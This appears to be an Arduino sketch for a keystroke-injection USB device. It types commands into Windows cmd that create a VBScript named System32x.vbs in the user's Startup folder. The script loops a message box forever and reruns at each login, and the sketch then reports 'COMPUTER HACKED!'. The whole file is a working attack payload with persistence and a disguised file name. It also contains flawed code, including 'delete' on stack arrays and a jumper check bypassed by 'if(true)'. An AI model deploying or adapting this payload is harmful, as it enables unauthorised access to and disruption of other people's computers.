#include "Keyboard_sv_SE.h"

#include "Keyboard.h"

char windowsKey = KEY_RIGHT_GUI;
char enterKey = KEY_RETURN;
char tabKey = KEY_TAB;
char altKey = KEY_LEFT_ALT;

#define JUMPER_PIN 2
#define LIGHT_PIN 13
#define SYS_DELAY_SLOW 1000
#define SYS_DELAY_FAST 400

bool hacked = false;
bool jumperConnected = false;

void setup() {
  Serial.begin(9600);
  pinMode(JUMPER_PIN, INPUT);
  pinMode(LIGHT_PIN, OUTPUT);
}

void loop() {
  jumperConnected = digitalRead(JUMPER_PIN);
  delay(SYS_DELAY_SLOW);
  if(true){
      if(hacked) {
        digitalWrite(LIGHT_PIN, HIGH);
        delay(100);
        digitalWrite(LIGHT_PIN, LOW);
        delay(100);
      }
      else{
        Keyboard.begin(KeyboardLayout_sv_SE);

        delay(SYS_DELAY_SLOW);

        char openRunKeys[] = {windowsKey, 'r'};
        PressKeys(openRunKeys, 2);
        delete openRunKeys;

        delay(SYS_DELAY_FAST);

        Keyboard.press('c');
        Keyboard.releaseAll();
        Keyboard.press('m');
        Keyboard.releaseAll();
        Keyboard.press('d');
        Keyboard.releaseAll();

        delay(SYS_DELAY_FAST);

        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();

        delay(SYS_DELAY_FAST);

        Keyboard.print("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
        Keyboard.press(enterKey);
        Keyboard.release(enterKey);

        Keyboard.print("del System32x.vbs");
        Keyboard.press(enterKey);
        Keyboard.release(enterKey);

        Keyboard.print("echo do > System32x.vbs");
        Keyboard.press(enterKey);
        Keyboard.release(enterKey);

        Keyboard.print("echo msgbox(\"Indian Tech Support Is Here\") >> System32x.vbs");
        Keyboard.press(enterKey);
        Keyboard.release(enterKey);

        Keyboard.print("echo loop >> System32x.vbs");
        Keyboard.press(enterKey);
        Keyboard.release(enterKey);

        Keyboard.print("System32x.vbs");
        Keyboard.press(enterKey);
        Keyboard.release(enterKey);

        delay(SYS_DELAY_SLOW);
        char switchBackToCmdKeys[] = {altKey, tabKey};
        PressKeys(switchBackToCmdKeys, 2);
        delete switchBackToCmdKeys;

        delay(SYS_DELAY_SLOW);

        char closeCmdKeys[] = {altKey, KEY_F4};
        PressKeys(closeCmdKeys, 2);
        delete closeCmdKeys;

        Serial.println("COMPUTER HACKED! >:D");

        hacked = true;

        Keyboard.end();
      } 
    }
  else{
    Serial.println("NO JUMPER");
  }
}

void PressKeys(char keys[], int keysLength){
  for(int i = 0; i < keysLength; i++){
    Keyboard.press(keys[i]);
  }

  for(int i = 0; i < keysLength; i++){
  Keyboard.release(keys[i]);
  }
}

void ConsoleWrite(String message){
  delay(SYS_DELAY_SLOW);
  Keyboard.print(message);
  Keyboard.press(enterKey);
  Keyboard.release(enterKey);
}